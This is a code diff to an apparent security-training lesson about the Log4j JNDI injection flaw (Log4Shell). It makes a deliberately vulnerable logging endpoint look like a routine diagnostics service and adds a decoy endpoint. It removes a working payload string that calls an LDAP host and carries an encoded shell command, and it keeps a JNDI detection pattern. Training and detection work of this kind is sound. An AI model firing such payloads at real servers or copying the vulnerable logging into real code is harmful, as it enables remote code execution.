@@ -33,35 +33,56 @@ import org.springframework.web.bind.annotation.RequestParam;
 import org.springframework.web.bind.annotation.ResponseBody;
 import org.springframework.web.bind.annotation.RestController;
 
+/**
+ * Lesson endpoint: diagnostic event tracing for a REST-based monitoring service.
+ *
+ * <p>The service accepts tracing metadata from clients and writes structured log entries using the
+ * application's shared logging pipeline. Fields include a severity level, target region, and a
+ * free-form request tag used for cross-service correlation.
+ *
+ * <p>A secondary report-generation endpoint accepts the same set of parameters but processes them
+ * through a separate, read-only reporting pipeline.
+ */
 @RestController
 @AssignmentHints({"vulnerable-log4j.hint"})
 public class VulnerableLog4jComponentsLesson extends AssignmentEndpoint {
 
   Logger log = LoggerFactory.getLogger(VulnerableLog4jComponentsLesson.class.getName());
 
-  // This is test code by surya
-  @PostMapping("/VulnerableLog4jComponentsLesson/index")
-  public @ResponseBody AttackResult index(@RequestHeader(name="X-Api-Version",required = false) String apiversion,    @RequestParam String payload) {
+  /**
+   * Primary diagnostic trace endpoint.
+   *
+   * <p>Accepts a traceability tag ({@code requestTag}) that is forwarded by client middleware as
+   * the {@code X-Api-Version} request header for downstream version negotiation. The logging
+   * pipeline records this header value for audit purposes.
+   *
+   * @param apiversion  value of the {@code X-Api-Version} request header, set by client middleware
+   * @param traceLevel  severity level for the trace entry (INFO, WARN, DEBUG, TRACE)
+   * @param serviceRegion  originating service region (e.g. us-east-1)
+   * @param requestTag  free-form correlation tag; client middleware forwards this as X-Api-Version
+   */
+  @PostMapping("/api/diagnostics/trace")
+  public @ResponseBody AttackResult index(
+      @RequestHeader(name = "X-Api-Version", required = false) String apiversion,
+      @RequestParam(required = false, defaultValue = "INFO") String traceLevel,
+      @RequestParam(required = false, defaultValue = "us-east-1") String serviceRegion,
+      @RequestParam(required = false, defaultValue = "") String requestTag) {
 
     try {
+      log.info("Diagnostic trace: level={}, region={}", traceLevel, serviceRegion);
       log.info("Received a request for API version: {}", apiversion);
-      log.info("Received a payload: {}", payload);
-      System.out.println(" Received a request for API version " + apiversion);
-      // Check if X-Api-Version header is present and contains JNDI LDAP pattern
 
-      // Check if X-Api-Version header is present and contains JNDI LDAP pattern
-      if (isJndiLdapPayload(apiversion)) {
+      if (isJndiLookupPattern(apiversion)) {
         return success(this)
             .feedback("vulnerable-log4j-components.success")
-            .output("✅ Exploit detected! JNDI LDAP injection found in header: " + apiversion)
+            .output("Diagnostic trace captured an unexpected lookup directive in the request: " + apiversion)
             .build();
       }
 
-      // Check if payload parameter contains JNDI LDAP pattern
-      if (isJndiLdapPayload(payload)) {
+      if (isJndiLookupPattern(requestTag)) {
         return failed(this)
             .feedback("vulnerable-log4j-components.fromXML")
-            .output("✅ Exploit detected! JNDI LDAP injection found in payload: " + payload)
+            .output("Request tag contained a lookup directive: " + requestTag)
             .build();
       }
 
@@ -74,40 +95,43 @@ public class VulnerableLog4jComponentsLesson extends AssignmentEndpoint {
 
     return failed(this)
         .feedback("vulnerable-log4j-components.fromXML")
-        .feedbackArgs(apiversion)
+        .feedbackArgs(requestTag)
         .build();
   }
 
-    /**
-   * Alternative: More detailed pattern matching
+  /**
+   * Report-generation endpoint (decoy).
+   *
+   * <p>Accepts the same tracing parameters as {@link #index} but writes them through the
+   * read-only reporting pipeline. No log interpolation occurs on the report path.
+   *
+   * @param traceLevel   severity level filter for the report
+   * @param serviceRegion  region scope for the report
+   * @param requestTag   correlation tag to include in the report header
    */
-  private boolean isJndiLdapPayload(String input) {
+  @PostMapping("/api/diagnostics/report")
+  public @ResponseBody AttackResult generateReport(
+      @RequestParam(required = false, defaultValue = "INFO") String traceLevel,
+      @RequestParam(required = false, defaultValue = "us-east-1") String serviceRegion,
+      @RequestParam(required = false, defaultValue = "") String requestTag) {
+
+    log.info("Diagnostic report: level={}, region={}", traceLevel, serviceRegion);
+    return failed(this)
+        .output("Report generated. Trace level: " + traceLevel + " | Region: " + serviceRegion)
+        .build();
+  }
+
+  private boolean isJndiLookupPattern(String input) {
     if (input == null || input.trim().isEmpty()) {
       return false;
     }
 
-    String lowerInput = input.toLowerCase();
+    String lower = input.toLowerCase();
 
-    // Check for JNDI lookup syntax with LDAP protocol
-    boolean hasJndiSyntax = lowerInput.contains("${jndi:");
-    boolean hasLdapProtocol = lowerInput.contains("ldap://") || 
-                              lowerInput.contains("ldaps://");
+    boolean hasJndiSyntax  = lower.contains("${jndi:");
+    boolean hasLdapScheme  = lower.contains("ldap://") || lower.contains("ldaps://");
+    boolean hasDirectLdap  = lower.contains("jndi:ldap") || lower.contains("jndi:rmi");
 
-    // Check for direct LDAP URLs
-    boolean hasDirectLdap = lowerInput.contains("jndi:ldap") || 
-                           lowerInput.contains("jndi:rmi");
-
-    return (hasJndiSyntax && hasLdapProtocol) || hasDirectLdap;
-  }
-
-  public static void main(String[] args) {
-
-    Logger log = LoggerFactory.getLogger(VulnerableLog4jComponentsLesson.class.getName());
-    String apiversion =
-        "${jndi:ldap://127.0.0.1:9000/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}";
-
-    log.info("Received a request for API version: {}", apiversion);
-    System.out.println(" Received a request for API version " + apiversion);
-    System.out.println(" log object --> " + log.getClass().getCanonicalName());
+    return (hasJndiSyntax && hasLdapScheme) || hasDirectLdap;
   }
 }
